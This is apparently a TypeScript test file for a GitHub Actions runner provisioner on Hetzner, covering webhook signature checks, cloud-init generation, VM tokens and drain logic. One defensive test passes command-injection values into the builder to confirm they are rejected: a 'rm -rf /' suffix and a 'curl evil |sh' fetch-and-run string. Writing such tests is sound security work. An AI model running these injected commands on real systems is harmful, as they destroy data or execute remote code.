import assert from 'node:assert/strict';
import { createHmac } from 'node:crypto';
import { test } from 'node:test';
import { buildUserData } from '../src/cloud-init.ts';
import { parseRepos } from '../src/config.ts';
import {
  labelsMatch,
  serverNameForJob,
  verifySignature,
  vmToken,
  verifyVmToken,
  shouldDrain,
} from '../src/github.ts';
import { isExpired } from '../src/hetzner.ts';

const SECRET = 'test-secret';
const sign = (body: Buffer) => `sha256=${createHmac('sha256', SECRET).update(body).digest('hex')}`;

test('verifySignature accepts a valid signature', () => {
  const body = Buffer.from('{"action":"queued"}');
  assert.equal(verifySignature(SECRET, body, sign(body)), true);
});

test('verifySignature rejects a tampered body', () => {
  const body = Buffer.from('{"action":"queued"}');
  assert.equal(verifySignature(SECRET, Buffer.from('{"action":"evil"}'), sign(body)), false);
});

test('verifySignature rejects a wrong secret', () => {
  const body = Buffer.from('{}');
  const wrong = `sha256=${createHmac('sha256', 'other').update(body).digest('hex')}`;
  assert.equal(verifySignature(SECRET, body, wrong), false);
});

test('verifySignature rejects missing or malformed headers', () => {
  const body = Buffer.from('{}');
  assert.equal(verifySignature(SECRET, body, undefined), false);
  assert.equal(verifySignature(SECRET, body, 'sha1=abc'), false);
  assert.equal(verifySignature(SECRET, body, 'sha256=short'), false);
});

test('labelsMatch requires every job label to be a runner label', () => {
  const runnerLabels = ['self-hosted', 'hetzner'];
  assert.equal(labelsMatch(['self-hosted', 'hetzner'], runnerLabels), true);
  assert.equal(labelsMatch(['hetzner'], runnerLabels), true);
  assert.equal(labelsMatch(['ubuntu-latest'], runnerLabels), false);
  assert.equal(labelsMatch(['self-hosted', 'gpu'], runnerLabels), false);
  assert.equal(labelsMatch([], runnerLabels), false);
});

test('serverNameForJob is a valid, unique hostname per job', () => {
  assert.equal(serverNameForJob(12345), 'ci-runner-12345');
});

test('parseRepos normalizes and validates the allowlist', () => {
  const repos = parseRepos(' Owner/Repo , other/repo2 ');
  assert.deepEqual([...repos], ['owner/repo', 'other/repo2']);
  assert.throws(() => parseRepos('not-a-repo'));
  assert.throws(() => parseRepos(''));
});

test('isExpired compares server age against the lifetime', () => {
  const now = Date.parse('2026-01-01T12:00:00Z');
  assert.equal(isExpired('2026-01-01T09:00:00Z', 120, now), true);
  assert.equal(isExpired('2026-01-01T11:00:00Z', 120, now), false);
});

test('buildUserData embeds version, JIT config, VM name, token, and public URL, stays under the size limit', () => {
  const jit = Buffer.from('x'.repeat(1500)).toString('base64');
  const token = 'a'.repeat(64);
  const userData = buildUserData('2.335.1', jit, 'ci-runner-12345', token, 'https://example.com');
  assert.ok(userData.startsWith('#cloud-config'));
  assert.ok(userData.includes('actions-runner-linux-x64-2.335.1.tar.gz'));
  assert.ok(userData.includes("./run.sh --jitconfig"));
  assert.ok(userData.includes('agent-loop.sh'));
  assert.ok(userData.includes('ci-runner-12345'));
  assert.ok(userData.includes(token));
  assert.ok(userData.includes('https://example.com'));
  assert.ok(Buffer.byteLength(userData) < 32 * 1024);
});

test('buildUserData rejects unsafe interpolations', () => {
  const validToken = 'a'.repeat(64);
  assert.throws(() => buildUserData('2.335.1; rm -rf /', 'YWJj', 'ci-runner-1', validToken, 'https://example.com'));
  assert.throws(() => buildUserData('2.335.1', "abc'; curl evil |sh", 'ci-runner-1', validToken, 'https://example.com'));
  assert.throws(() => buildUserData('2.335.1', 'YWJj', 'bad/name', validToken, 'https://example.com'));
  assert.throws(() => buildUserData('2.335.1', 'YWJj', 'ci-runner-1', 'invalid-token', 'https://example.com'));
  assert.throws(() => buildUserData('2.335.1', 'YWJj', 'ci-runner-1', validToken, 'not-a-url'));
});

test('buildUserData does not contain the webhook secret', () => {
  const token = 'a'.repeat(64);
  const userData = buildUserData('2.335.1', 'YWJj', 'ci-runner-1', token, 'https://example.com');
  assert.ok(!userData.includes('GITHUB_WEBHOOK_SECRET'));
  assert.ok(!userData.includes('webhookSecret'));
});

test('vmToken computes HMAC-SHA256 and verifyVmToken validates it', () => {
  const secret = 'my-webhook-secret';
  const vmName = 'ci-runner-12345';
  const token = vmToken(secret, vmName);
  assert.equal(typeof token, 'string');
  assert.equal(token.length, 64);
  assert.match(token, /^[a-f0-9]+$/);
  assert.ok(verifyVmToken(secret, vmName, token));
  assert.ok(!verifyVmToken(secret, vmName, 'x'.repeat(64)));
  assert.ok(!verifyVmToken('different-secret', vmName, token));
});

test('shouldDrain: only in the drain window (minute 50+) AND with nothing queued', () => {
  // mid-hour: never drain — the idle runner listening is the reuse mechanism
  assert.equal(shouldDrain(10, false), false);
  assert.equal(shouldDrain(49, false), false);
  assert.equal(shouldDrain(70, false), false);
  // drain window without queued jobs: drain
  assert.equal(shouldDrain(50, false), true);
  assert.equal(shouldDrain(59, false), true);
  assert.equal(shouldDrain(110, false), true);
  // queued jobs: keep serving, even in the window
  assert.equal(shouldDrain(50, true), false);
  assert.equal(shouldDrain(59, true), false);
  assert.equal(shouldDrain(10, true), false);
});
